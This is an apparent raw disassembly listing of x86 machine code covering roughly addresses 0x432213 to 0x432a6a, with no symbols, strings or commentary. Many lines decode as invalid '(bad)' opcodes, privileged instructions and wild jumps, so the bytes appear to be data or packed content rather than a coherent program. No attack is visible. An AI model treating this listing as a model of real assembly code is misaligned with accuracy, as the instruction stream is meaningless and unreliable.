  432213:	sub    DWORD PTR [edi+0x45],ecx
  432216:	add    BYTE PTR [eax],ch
  432218:	js     0x43225f
  43221a:	data16 jle 0x4321a2
  43221d:	idiv   bh
  43221f:	inc    esp
  432220:	(bad)  
  432221:	fadd   st(7),st
  432223:	mov    dh,0x89
  432225:	and    DWORD PTR [esi+0x44],0xffffffff
  432229:	fld    DWORD PTR [ebx-0x767cbc78]
  43222f:	pop    es
  432230:	push   0x8d45ffec
  432235:	jmp    0xe6cc673d
  43223a:	push   0x45
  43223c:	jmp    edx
  43223e:	add    DWORD PTR [ebp+0xd],0xfffffff5
  432242:	mov    DWORD PTR [ebp+0x6c],eax
  432245:	(bad)  
  432247:	inc    ebp
  432248:	(bad)  
  432249:	out    dx,al
  43224a:	add    al,0x45
  43224c:	mov    edi,esp
  43224e:	outs   dx,BYTE PTR ds:[esi]
  43224f:	inc    ebp
  432250:	(bad)  
  432251:	jle    0x4321d6
  432253:	idiv   BYTE PTR ds:0x70bc8944
  432259:	mov    dh,0xff
  43225b:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  432262:	jb     0x4321e7
  432264:	dec    DWORD PTR [eax]
  432266:	mov    ebp,esp
  432268:	test   WORD PTR [ebp-0x1],ax
  43226f:	inc    ebp
  432270:	ror    BYTE PTR [ebx-0x137a279a],0xff
  432277:	adc    edi,edi
  432279:	mov    ebp,edi
  43227b:	mov    eax,DWORD PTR [eax]
  43227d:	cmp    BYTE PTR [esi-0x1],ah
  432280:	test   DWORD PTR [ebx],edi
  432282:	push   DWORD PTR [ebp-0x1]
  432285:	mov    DWORD PTR [esi-0x48],ebp
  432288:	add    BYTE PTR [ebp+0x66],al
  43228b:	jmp    0x432212
  43228d:	pushf  
  43228e:	dec    DWORD PTR [ebx-0x7f940301]
  432294:	add    BYTE PTR [ecx],al
  432296:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43229d:	add    al,al
  43229f:	add    BYTE PTR [esi+0x45],ah
  4322a2:	test   DWORD PTR [ebx+0xff7cff],ecx
  4322a8:	inc    eax
  4322a9:	mov    DWORD PTR [eax],eax
  4322ab:	mov    esp,DWORD PTR [esi-0x4]
  4322ae:	inc    ebp
  4322af:	cmp    BYTE PTR [eax+0x4701],0x38
  4322b6:	mov    DWORD PTR [ebp-0x7e],ebp
  4322b9:	add    BYTE PTR [edi-0x73],al
  4322bc:	push   0xffffffcd
  4322be:	mov    WORD PTR [ebp+0x64],ax
  4322c2:	(bad)  
  4322c3:	call   eax
  4322c5:	mov    esp,esi
  4322c7:	data16 cmc 
  4322c9:	test   DWORD PTR [ebp-0x1],eax
  4322cc:	(bad)  
  4322ce:	out    0xc0,eax
  4322d0:	lea    esp,[esi-0x30]
  4322d3:	test   DWORD PTR [edx+0x44ff80ff],ecx
  4322d9:	inc    edi
  4322da:	jmp    0x75ff:0x40858866
  4322e1:	dec    DWORD PTR [ebp-0x7a992f40]
  4322e7:	test   esi,edi
  4322e9:	(bad)  
  4322ea:	(bad)  
  4322eb:	inc    DWORD PTR [ebp-0x9901b9]
  4322f1:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  4322f7:	rcl    BYTE PTR [ecx+0x66],0x33
  4322fb:	test   DWORD PTR [ebx+0xff72ff],edi
  432301:	inc    edi
  432302:	ret    
  432303:	mov    ax,WORD PTR [ebp-0x3f0004]
  43230a:	push   eax
  43230b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432312:	add    BYTE PTR [ebx-0x764f0839],al
  432318:	push   DWORD PTR [esi+0x1]
  43231b:	inc    DWORD PTR [eax]
  43231d:	mov    eax,0xff99ff
  432322:	or     BYTE PTR [ecx-0x7a87bb],cl
  432328:	jne    0x4322e2
  43232a:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  432334:	mov    ecx,0xd74fb8
  432339:	add    cl,al
  43233b:	mov    DWORD PTR [ecx-0x3f007784],ecx
  432341:	or     DWORD PTR [ebx+0x558966e4],0x7e
  432348:	(bad)  
  432349:	(bad)  
  43234a:	std    
  43234b:	mov    eax,0x8c2789
  432350:	ret    0x6689
  432353:	adc    BYTE PTR [ebp+0x40],0x8d
  432357:	add    bh,ah
  432359:	mov    WORD PTR [ebp-0x70],ax
  43235d:	(bad)  
  43235e:	ret    0x6605
  432361:	or     BYTE PTR [ebp-0x77],dl
  432364:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  43236b:	loop   0x4322f6
  43236d:	(bad)  
  43236e:	xchg   esi,eax
  43236f:	aam    0xcf
  432371:	out    dx,al
  432372:	mov    DWORD PTR [esi-0x68],edi
  432375:	inc    ebp
  432376:	dec    edx
  432377:	pop    ecx
  432378:	mov    edx,DWORD PTR [eax]
  43237a:	repnz push bp
  43237d:	or     BYTE PTR [ebx+0x5510663a],0x49
  432384:	(bad)  
  432385:	repnz cmp eax,0xa0898945
  43238b:	mov    ah,0x89
  43238d:	jmp    DWORD PTR [edx+0x66b0418d]
  432393:	inc    DWORD PTR [ebp+0x50]
  432396:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43239a:	mov    DWORD PTR [eax],ecx
  43239c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43239d:	pop    es
  43239e:	inc    ecx
  43239f:	(bad)  
  4323a0:	cwd    
  4323a2:	inc    ebp
  4323a3:	xor    ah,BYTE PTR [esi+0x3]
  4323a6:	dec    ebp
  4323a7:	push   eax
  4323a8:	inc    bp
  4323aa:	jge    0x43232f
  4323ac:	mov    esp,DWORD PTR [esi-0x18]
  4323af:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4323b5:	add    DWORD PTR [ebx],esi
  4323b7:	add    BYTE PTR [ebx],al
  4323b9:	test   DWORD PTR [ebx],esi
  4323bb:	(bad)  
  4323bc:	inc    WORD PTR [ebp+0x0]
  4323c0:	mov    eax,DWORD PTR [eax]
  4323c2:	call   0x8898daf7
  4323c7:	mov    esi,eax
  4323c9:	clc    
  4323ca:	ret    
  4323cb:	rol    cl,0xa
  4323ce:	mov    DWORD PTR ds:0x7c0ec88,esi
  4323d4:	mov    edx,edi
  4323d6:	pushf  
  4323d7:	pop    es
  4323d8:	jmp    DWORD PTR [edx+0x66]
  4323db:	add    BYTE PTR [ebp-0x990175],al
  4323e1:	inc    ebp
  4323e2:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4323e8:	push   ebp
  4323e9:	mov    edi,eax
  4323eb:	mov    dh,BYTE PTR [eax+0x266ff51]
  4323f1:	push   ebp
  4323f2:	add    BYTE PTR [ebx-0x764b0777],al
  4323f8:	dec    DWORD PTR [esi+0x661851e8]
  4323fe:	add    BYTE PTR [ebp-0x7b],dl
  432401:	cmp    esi,0x3
  432404:	dec    DWORD PTR [ecx+0x51fe9285]
  43240a:	jmp    DWORD PTR [esi-0x75]
  43240d:	push   ebp
  43240e:	hlt    
  43240f:	data16 (bad) 
  432411:	dec    ebp
  432412:	ret    
  432413:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432419:	lea    edx,[eax-0x1]
  43241c:	jne    0x4323ef
  43241e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  432424:	dec    BYTE PTR [ecx+0x51559eff]
  43242a:	mov    DWORD PTR [esi-0x4c],esp
  43242d:	push   ebp
  43242e:	jmp    DWORD PTR [esi-0x18]
  432431:	inc    ebp
  432432:	sbb    BYTE PTR [ebp-0x767ad900],cl
  432438:	(bad)  
  432439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43243a:	inc    eax
  43243c:	test   DWORD PTR [esi-0x2],esp
  43243f:	inc    ebp
  432440:	dec    DWORD PTR [ebp-0x760bde75]
  432446:	(bad)  
  432447:	test   al,0xc3
  432449:	mov    DWORD PTR [ebp-0x769b56],ecx
  43244f:	lods   al,BYTE PTR ds:[esi]
  432450:	push   eax
  432451:	inc    ebp
  432452:	jne    0x432463
  432454:	dec    DWORD PTR [ebp+0x8]
  432457:	mov    eax,DWORD PTR [edi]
  432459:	sbb    al,0x0
  43245b:	(bad)  
  43245c:	mov    eax,0xc14fc3
  432461:	mov    DWORD PTR [eax-0x64],edi
  432464:	inc    bp
  432466:	test   DWORD PTR [edi],ecx
  432468:	dec    DWORD PTR [ebp-0x1]
  43246b:	xor    eax,edi
  43246d:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  432473:	inc    ebp
  432474:	xor    DWORD PTR [ebx],0x43
  432477:	mov    WORD PTR [ebp-0x1bc],ax
  43247e:	lea    ecx,[ecx-0x7677fe]
  432484:	inc    esi
  432485:	(bad)  
  432486:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43248d:	pushf  
  43248e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432495:	add    bh,bh
  432497:	add    BYTE PTR [edi],cl
  432499:	test   DWORD PTR [eax],eax
  43249b:	(bad)  
  43249c:	dec    WORD PTR [ebp-0xff002d]
  4324a3:	mov    DWORD PTR [eax-0x48],esi
  4324a6:	add    bh,bh
  4324a8:	lea    cx,[ebp-0x50]
  4324af:	push   eax
  4324b0:	rol    BYTE PTR [ebp+0x0],1
  4324b3:	xor    esp,DWORD PTR [esi+0x3]
  4324b6:	lea    edx,[eax-0x1]
  4324b9:	test   edi,edi
  4324bb:	dec    DWORD PTR [ebp-0x1]
  4324be:	mov    edi,edi
  4324c0:	dec    eax
  4324c1:	clc    
  4324c2:	call   DWORD PTR [ebp-0x73]
  4324c5:	lea    esi,[eax+0x51ffff88]
  4324cb:	lea    ecx,[ebp-0x78]
  4324ce:	test   WORD PTR [ebp-0x2],ax
  4324d5:	popf   
  4324d6:	push   ecx
  4324d7:	add    BYTE PTR [ecx-0x77],dl
  4324da:	xor    edi,DWORD PTR [eax-0x724a007d]
  4324e0:	cdq    
  4324e1:	mov    al,0x32
  4324e3:	inc    DWORD PTR [ebx]
  4324e5:	push   eax
  4324e6:	push   ecx
  4324e7:	inc    ebp
  4324e8:	shl    BYTE PTR [ebx],1
  4324ea:	lea    eax,[ebx]
  4324ec:	call   DWORD PTR [eax-0x1]
  4324ef:	test   DWORD PTR [ebx],esi
  4324f1:	inc    DWORD PTR [eax-0x1]
  4324f4:	(bad)  
  4324f5:	(bad)  
  4324f6:	(bad)  
  4324f7:	clc    
  4324f8:	call   DWORD PTR [ebp+0x50]
  4324fb:	jmp    0xcc2675
  432500:	inc    esp
  432501:	jae    0x432502
  432503:	add    BYTE PTR [ecx-0x384f73],cl
  432509:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43250f:	mov    eax,DWORD PTR [ecx]
  432511:	data16 add BYTE PTR [ebp-0xb50077],al
  432518:	inc    eax
  43251a:	lea    esp,[esi+0x1c]
  43251d:	test   DWORD PTR [ecx-0xb301],ecx
  432523:	inc    edi
  432524:	(bad)  
  432525:	dec    si
  432527:	test   edi,edi
  432529:	push   DWORD PTR [ecx]
  43252b:	(bad)  
  43252c:	jnp    0x43257d
  43252e:	(bad)  
  43252f:	mov    edx,DWORD PTR [edx-0x7d]
  432532:	(bad)  
  432533:	mov    ebx,0x563a8935
  432538:	(bad)  
  432539:	call   FWORD PTR [esi-0x47]
  43253c:	inc    DWORD PTR ds:0x893000e2
  432542:	(bad)  
  432543:	pop    eax
  432544:	mov    ah,0xff
  432546:	(bad)  
  432547:	mov    ecx,0x5745
  43254c:	dec    DWORD PTR [ecx-0xf7a501]
  432552:	(bad)  
  432553:	mov    ecx,0x456108
  432558:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  43255e:	test   BYTE PTR [ebp-0x72ff23fd],cl
  432564:	inc    BYTE PTR gs:[eax]
  432567:	inc    DWORD PTR [ebp-0x73]
  43256a:	ss (bad) 
  43256c:	pushf  
  43256d:	inc    edi
  43256f:	mov    ebx,eax
  432571:	hlt    
  432572:	test   DWORD PTR [ecx-0xbab708],ecx
  432578:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  43257e:	lock into 
  432580:	test   eax,eax
  432582:	clc    
  432583:	mov    ebx,0x367245
  432588:	lahf   
  432589:	retf   
  43258a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432590:	add    edi,edi
  432592:	add    BYTE PTR [ecx+0x45],dl
  432595:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43259c:	mov    edx,DWORD PTR [ecx-0x74]
  43259f:	inc    DWORD PTR [eax]
  4325a1:	cld    
  4325a2:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4325a8:	add    BYTE PTR [ebp-0x1b0177],al
  4325ae:	jge    0x4325f5
  4325b0:	test   DWORD PTR [ebx+0xff9875],ecx
  4325b6:	sbb    BYTE PTR [esi+0x55],ah
  4325b9:	xchg   ebp,eax
  4325ba:	call   0x4320be
  4325bf:	push   edi
  4325c0:	inc    ebp
  4325c1:	mov    dx,WORD PTR [ebp-0xfc0075]
  4325c8:	cmp    al,0x85
  4325ca:	ud0    eax,DWORD PTR [ebp-0x1]
  4325ce:	test   DWORD PTR [edi+0x74],ecx
  4325d1:	dec    edi
  4325d2:	inc    DWORD PTR [ebp-0xf70004]
  4325d8:	dec    DWORD PTR [edi-0x75]
  4325db:	dec    edi
  4325dc:	cld    
  4325dd:	test   DWORD PTR [eax+0xff01ff],eax
  4325e3:	icebp  
  4325e4:	add    BYTE PTR [edi-0x3a],cl
  4325e7:	test   ebx,eax
  4325e9:	inc    BYTE PTR [ebp-0x1]
  4325ec:	jne    0x4325ee
  4325ee:	mov    eax,DWORD PTR [eax]
  4325f0:	cld    
  4325f1:	xor    BYTE PTR [ecx+0x500155],cl
  4325f7:	push   ebp
  4325f8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4325fe:	add    BYTE PTR [ebp+0x35e90f50],al
  432604:	add    al,BYTE PTR [eax]
  432606:	add    BYTE PTR [ebx-0x38fe4f80],al
  43260c:	add    ah,ch
  43260e:	or     BYTE PTR [ebp+0x4501f845],dh
  432614:	jmp    0xdf290f
  432619:	(bad)  
  43261a:	nop    ecx
  43261d:	test   DWORD PTR [ebp+0x4502f8],eax
  432623:	cmp    BYTE PTR [ebp-0x64],cl
  432626:	mov    eax,edi
  432628:	mov    ebx,DWORD PTR [eax+edx*2]
  43262b:	add    eax,0x45fef885
  432630:	dec    DWORD PTR [ebx+0x339445]
  432636:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43263c:	dec    DWORD PTR [ebx-0x460f0375]
  432642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432643:	add    esi,edi
  432645:	add    bh,bh
  432647:	rdpmc  
  432649:	add    BYTE PTR [ebx],0x1
  43264c:	mov    DWORD PTR [eax],eax
  43264e:	add    al,0x45
  432650:	dec    DWORD PTR [ecx-0x360b3373]
  432656:	dec    DWORD PTR [esi]
  432658:	push   eax
  432659:	jne    0x4326a0
  43265b:	mov    esi,DWORD PTR [ebx]
  43265d:	cld    
  43265e:	add    ebp,ebx
  432660:	push   eax
  432661:	inc    DWORD PTR [ebp-0x75]
  432664:	add    eax,0x800e4
  432669:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43266f:	mov    DWORD PTR [ecx],eax
  432671:	sbb    al,0x0
  432673:	leave  
  432674:	test   DWORD PTR [edi-0x2],eax
  432677:	jne    0x432678
  432679:	call   0xff44117e
  43267e:	xor    BYTE PTR [ebp+0x4d],al
  432681:	mov    edi,edi
  432683:	enter  0x8,0x4d
  432687:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43268d:	mov    eax,DWORD PTR [eax]
  43268f:	cld    
  432690:	add    DWORD PTR [ecx],ebx
  432692:	inc    ebp
  432693:	dec    ebp
  432694:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43269a:	inc    eax
  43269b:	dec    DWORD PTR [ecx-0x270375]
  4326a1:	add    BYTE PTR [ebx-0x39d72701],cl
  4326a7:	xchg   ecx,eax
  4326a8:	ret    
  4326a9:	add    BYTE PTR [ebp-0x830075],al
  4326af:	add    BYTE PTR [ebp-0x75],al
  4326b2:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4326b8:	lea    edi,[edi-0xc]
  4326bb:	add    bh,bh
  4326bd:	mov    edx,DWORD PTR [eax-0x7b]
  4326c0:	inc    ebp
  4326c1:	rdpmc  
  4326c3:	jne    0x4326c8
  4326c5:	add    BYTE PTR [eax-0x75],dl
  4326c8:	inc    ebp
  4326c9:	clc    
  4326ca:	add    eax,0x400009
  4326cf:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4326d5:	mov    eax,DWORD PTR [ecx]
  4326d7:	in     al,dx
  4326d8:	add    dh,al
  4326da:	test   ebx,eax
  4326dc:	inc    BYTE PTR [ebp-0xff0001]
  4326e2:	add    BYTE PTR [ebp-0x43],al
  4326e5:	cmp    esi,0xfffffff8
  4326e8:	(bad)  
  4326e9:	push   DWORD PTR [eax]
  4326eb:	add    BYTE PTR [ebp-0x3a],dl
  4326ee:	test   ebx,eax
  4326f0:	je     0x432677
  4326f2:	mov    edi,edi
  4326f4:	sbb    al,0xff
  4326f6:	test   DWORD PTR gs:[eax],eax
  4326f9:	(bad)  
  4326fa:	js     0x4326fb
  4326fc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432702:	sub    eax,ebx
  432704:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43270a:	add    eax,DWORD PTR [eax]
  43270c:	dec    ebp
  43270d:	push   eax
  43270e:	mov    al,BYTE PTR [ebp+0x1]
  432711:	mov    eax,DWORD PTR [ebp-0x68]
  432714:	mov    eax,DWORD PTR [eax]
  432716:	sbb    bh,al
  432718:	or     ah,dh
  43271a:	dec    ebp
  43271b:	inc    DWORD PTR [eax+0x4]
  43271e:	push   ecx
  43271f:	add    BYTE PTR [edx-0x1],dh
  432722:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  432728:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  432732:	add    ecx,DWORD PTR [ecx-0x1be77477]
  432738:	push   ecx
  432739:	cmp    BYTE PTR [ebx],al
  43273b:	inc    ebp
  43273c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  432742:	(bad)  
  432743:	(bad)  
  432744:	in     al,0xff
  432746:	add    BYTE PTR [ebp+0x0],al
  432749:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43274f:	add    al,bh
  432751:	(bad)  
  432752:	jmp    0x8d85:0x74b0558d
  432759:	dec    DWORD PTR [eax]
  43275b:	call   DWORD PTR [ebp-0x7b]
  43275e:	mov    edi,esi
  432760:	lock call DWORD PTR [ebp-0x75]
  432764:	mov    esi,esp
  432766:	mov    ah,0xc6
  432768:	mov    bh,0xc3
  43276a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  432770:	add    DWORD PTR [eax],0x450050ff
  432776:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43277c:	inc    edi
  43277e:	push   esp
  432780:	jmp    0xcd00:0x670481ff
  432787:	mov    DWORD PTR [ebx],esi
  432789:	clc    
  43278a:	cmp    edi,0xff9cff3b
  432790:	jne    0x43279a
  432792:	mov    eax,eax
  432794:	add    esi,DWORD PTR [eax]
  432796:	int3   
  432797:	inc    ebp
  432798:	cmp    al,0x83
  43279a:	add    BYTE PTR [eax],bl
  43279c:	adc    DWORD PTR [ebx+0x768b5055],eax
  4327a2:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4327a8:	mov    edi,eax
  4327aa:	cmp    BYTE PTR [ebp+0x45],cl
  4327ad:	jmp    0x43273a
  4327af:	mov    ebx,DWORD PTR [esp+ebp*8]
  4327b2:	inc    ebp
  4327b3:	or     al,0x2
  4327b5:	dec    DWORD PTR [ebp+0x18]
  4327b8:	jne    0x43280f
  4327ba:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4327c0:	mov    edi,DWORD PTR [ebx]
  4327c2:	in     al,0x50
  4327c4:	xchg   ecx,eax
  4327c5:	jmp    0x34376ca
  4327ca:	adc    al,0x8b
  4327cc:	inc    ebp
  4327cd:	mov    al,ds:0x8b04008b
  4327d2:	push   ebp
  4327d3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4327d9:	push   ebp
  4327da:	test   DWORD PTR [ebx-0x2800d701],ecx
  4327e0:	inc    ebp
  4327e1:	dec    ebp
  4327e2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4327e8:	mov    DWORD PTR [eax],0xe9ff00f4
  4327ee:	add    al,0x0
  4327f0:	add    BYTE PTR [eax],al
  4327f2:	mov    eax,edx
  4327f4:	push   eax
  4327f5:	rol    DWORD PTR [ebp-0xf0177],1
  4327fb:	bound  eax,QWORD PTR [ebp+0x50]
  4327fe:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432804:	add    BYTE PTR [ecx+0x558df0ff],cl
  43280a:	mov    al,0xf
  43280c:	test   DWORD PTR [edx],edx
  43280e:	call   DWORD PTR [ebp-0x7a0001]
  432814:	(bad)  
  432815:	loop   0x432816
  432817:	jnp    0xc6991c1d
  43281d:	mov    eax,ebx
  43281f:	cmp    al,0x8b
  432821:	(bad)  
  432822:	cld    
  432823:	shr    esi,0xc
  432826:	add    dl,al
  432828:	push   eax
  432829:	lea    eax,[ebp-0x1]
  43282c:	mov    edx,esi
  43282e:	cwde   
  43282f:	cli    
  432830:	add    BYTE PTR [ebp+0x1ffff8ff],al
  432836:	or     BYTE PTR [eax],cl
  432838:	inc    ebp
  432839:	dec    ebp
  43283a:	inc    DWORD PTR [ebx+0x74803914]
  432840:	add    DWORD PTR [ebx+0x451800],ecx
  432846:	call   DWORD PTR [eax+edx*1]
  432849:	add    ecx,DWORD PTR [ebp-0x34]
  43284c:	push   edi
  43284d:	adc    al,0x8
  43284f:	mov    edx,DWORD PTR [ebp-0x14]
  432852:	mov    ecx,DWORD PTR [ebp+0x18]
  432855:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  432859:	inc    DWORD PTR [eax+esi*8]
  43285c:	inc    ebp
  43285d:	stos   BYTE PTR es:[edi],al
  43285e:	mov    edx,DWORD PTR [ebp-0x4]
  432861:	add    DWORD PTR [ebp-0x1c],eax
  432864:	mov    edx,DWORD PTR [ebp-0x70]
  432867:	cmp    eax,DWORD PTR [eax]
  432869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43286a:	mov    eax,DWORD PTR [eax]
  43286c:	cld    
  43286d:	jae    0x4327ef
  43286f:	add    eax,DWORD PTR [ecx]
  432871:	clc    
  432872:	add    BYTE PTR [eax+0x30],dl
  432875:	mov    DWORD PTR [ecx],esi
  432877:	clc    
  432878:	pop    ds
  432879:	inc    ebp
  43287a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432880:	(bad)  
  432881:	push   DWORD PTR [edi]
  432883:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432889:	(bad)  
  43288a:	jae    0x43288b
  43288c:	mov    eax,DWORD PTR [ebp-0x740175]
  432892:	sub    eax,DWORD PTR [eax]
  432894:	add    eax,DWORD PTR [eax]
  432896:	mov    DWORD PTR [ecx+0x5f],eax
  432899:	mov    DWORD PTR [ebx-0x4],ebx
  43289c:	ret    0xff
  43289f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4328a5:	ret    
  4328a6:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4328ac:	add    BYTE PTR [ebp-0x7d],al
  4328af:	mov    DWORD PTR [eax],eax
  4328b1:	add    al,0x84
  4328b3:	inc    DWORD PTR [ecx]
  4328b5:	lea    eax,[eax]
  4328b7:	hlt    
  4328b8:	sar    bh,cl
  4328ba:	test   BYTE PTR [eax+0x1],dl
  4328bd:	inc    ebp
  4328be:	add    BYTE PTR [ebx],dh
  4328c0:	test   BYTE PTR [ebx],0x84
  4328c3:	push   eax
  4328c4:	add    BYTE PTR [ebp+0x0],al
  4328c7:	add    eax,0x86
  4328cc:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4328d2:	add    BYTE PTR [ecx],al
  4328d4:	add    BYTE PTR [eax],al
  4328d6:	mov    esi,0x550030
  4328db:	mov    ecx,DWORD PTR [edi]
  4328dd:	cld    
  4328de:	fidiv  DWORD PTR [ebp+0x0]
  4328e1:	mov    edi,DWORD PTR [ecx]
  4328e3:	xor    BYTE PTR [eax+eax*1],0x84
  4328e7:	add    eax,DWORD PTR [eax]
  4328e9:	sbb    BYTE PTR [eax],al
  4328eb:	jne    0x43289e
  4328ed:	mov    eax,DWORD PTR [ecx]
  4328ef:	sbb    BYTE PTR [eax],al
  4328f1:	mov    DWORD PTR [ebp-0x1],esp
  4328f4:	add    BYTE PTR [eax+0x30e45ca],bh
  4328fa:	ret    0xb7fc
  4328fd:	dec    ebp
  4328fe:	or     al,0x89
  432900:	dec    ebp
  432901:	cld    
  432902:	cmovne ecx,DWORD PTR [eax-0x75]
  432906:	add    edi,esp
  432908:	seto   BYTE PTR [esi-0x72ffffff]
  43290f:	inc    ebp
  432910:	adc    al,0x8b
  432912:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432919:	cmp    DWORD PTR [edi+0x72],edx
  43291c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  432922:	gs cmp al,0x0
  432925:	je     0x4328fd
  432927:	push   eax
  432928:	sar    BYTE PTR [eax],1
  43292a:	mov    bh,0x3e
  43292c:	push   cs
  43292d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  432933:	add    DWORD PTR [ecx+0x12],ebp
  432936:	dec    edx
  432937:	(bad)  
  432938:	mov    eax,edx
  43293a:	in     al,dx
  43293b:	adc    DWORD PTR [ecx],esi
  43293d:	pop    esi
  43293e:	inc    ecx
  43293f:	leave  
  432940:	or     DWORD PTR [eax],ebx
  432942:	gs push ebp
  432944:	add    ah,ch
  432946:	into   
  432947:	in     al,dx
  432948:	enter  0xb756,0xf0
  43294c:	push   cs
  43294d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  432957:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43295d:	jnp    0x7443ae65
  432963:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  432969:	add    BYTE PTR [edi],cl
  43296b:	mov    edi,DWORD PTR [ecx-0x78]
  43296e:	ltr    WORD PTR [ecx-0x7b]
  432972:	dec    DWORD PTR [edi]
  432974:	clc    
  432975:	out    0x45,eax
  432977:	add    BYTE PTR [eax],cl
  432979:	cmp    ebx,0xffffff8c
  43297c:	jge    0x43297e
  43297e:	jb     0x432990
  432980:	je     0x522a00
  432986:	pop    edx
  432987:	push   esi
  432988:	mov    ecx,DWORD PTR [edi]
  43298a:	in     al,dx
  43298b:	rol    DWORD PTR [ebp+0x0],1
  43298e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432995:	cmp    DWORD PTR [ecx],0xfffffff0
  432998:	hlt    
  432999:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43299f:	(bad)  
  4329a1:	push   eax
  4329a2:	jns    0xb8430e20
  4329a8:	lock push cs
  4329aa:	ror    edx,0x3
  4329ad:	test   BYTE PTR [ecx+0x5500e800],cl
  4329b3:	dec    eax
  4329b4:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4329b8:	(bad)  
  4329b9:	mov    esi,0x7f33ff5f
  4329be:	inc    eax
  4329bf:	test   DWORD PTR [edx],eax
  4329c1:	je     0x432983
  4329c3:	mov    ecx,ecx
  4329c5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4329c9:	and    eax,DWORD PTR [eax+0xf0103]
  4329cf:	jp     0x4329bd
  4329d1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4329d5:	add    edx,DWORD PTR [edi+0x74]
  4329d8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4329de:	add    BYTE PTR [ebp-0x74c48bbb],al
  4329e4:	je     0x432969
  4329e6:	cmp    eax,edi
  4329e8:	js     0x432a0d
  4329ea:	add    eax,0xeb0fc003
  4329ef:	jns    0x43297c
  4329f1:	vmread DWORD PTR [ecx+0x45],ebx
  4329f5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4329fb:	adc    al,0x8b
  4329fd:	jge    0x432a13
  4329ff:	mov    edi,DWORD PTR [eax-0x4]
  432a02:	add    edi,DWORD PTR [edi]
  432a04:	or     bh,bh
  432a06:	push   ebp
  432a07:	push   es
  432a08:	mov    DWORD PTR [ebp-0x4],ebx
  432a0b:	add    edi,esi
  432a0d:	pop    es
  432a0e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432a14:	mov    DWORD PTR [esp+esi*8],ecx
  432a17:	inc    ebp
  432a18:	pop    ebp
  432a19:	xor    DWORD PTR [esi-0x4],0x3b
  432a1d:	add    edx,DWORD PTR [ecx+edi*1]
  432a20:	push   es
  432a21:	clc    
  432a22:	mov    bh,0xdb
  432a24:	jp     0x4329dd
  432a26:	add    cl,BYTE PTR [esi]
  432a28:	div    DWORD PTR [edi+0x4d8b0c1c]
  432a2e:	test   edi,edi
  432a30:	je     0x432a26
  432a32:	mov    eax,ecx
  432a34:	or     BYTE PTR [ebx],al
  432a36:	dec    BYTE PTR [ecx+0x7d3bec7d]
  432a3c:	jbe    0x432ab0
  432a3e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  432a44:	add    ecx,DWORD PTR [esi]
  432a46:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  432a4c:	add    eax,DWORD PTR [ebx-0x287af783]
  432a52:	je     0x432aa1
  432a54:	mov    DWORD PTR [ecx],edi
  432a56:	mov    esi,eax
  432a58:	hlt    
  432a59:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  432a60:	jb     0x432a22
  432a62:	jmp    0x432a4f
  432a64:	xor    esi,DWORD PTR [ebx]
  432a66:	pop    edi
  432a67:	pop    esi
  432a68:	pop    ebx
  432a69:	ret    
  432a6a:	ret    0x8b
